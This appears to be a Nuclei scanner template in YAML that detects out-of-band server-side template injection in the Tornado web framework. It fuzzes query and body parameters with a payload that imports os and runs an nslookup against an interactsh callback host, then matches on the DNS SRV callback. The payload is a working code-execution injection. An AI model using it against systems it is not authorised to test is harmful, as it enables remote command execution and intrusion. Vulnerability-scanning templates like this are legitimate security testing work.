id: tornado-oob
info:
  name: Tornado - Out of Band Template Injection
  author: 0xAwali,DhiyaneshDK
  severity: high
  reference:
    - https://www.tornadoweb.org/en/stable/guide/templates.html
    - https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756
  metadata:
    verified: true
  tags: dast,oast,oob,ssti,vuln
http:
  - fuzzing:
      - fuzz:
          - '{{injection}}'
        mode: single
        parts:
          - query
          - body
        type: postfix
    matchers:
      - condition: and
        # digest: 490a00463044022014852555bda22cb81ecf0864a90d017aec12da77e140f7ad51f038c7183f1f68022008296a68151cbbe6755eb57d5d85eb8c3efe1ebdccfa0b1f870e0ca22ee747a8:922c64590222798bb761d5b6d8e72950

        dsl:
          - contains(interactsh_protocol,'dns')
          - contains(interactsh_request,'srv')
        name: request-matcher
        type: dsl
    payloads:
      injection:
        - '{%25import+os%25}{{os.system(''nslookup+-type=SRV+{{interactsh-url}}'')}}'
    pre-condition:
      - dsl:
          - method == "GET"
          - method == "POST"
          - method == "PUT"
        type: dsl
    skip-variables-check: true
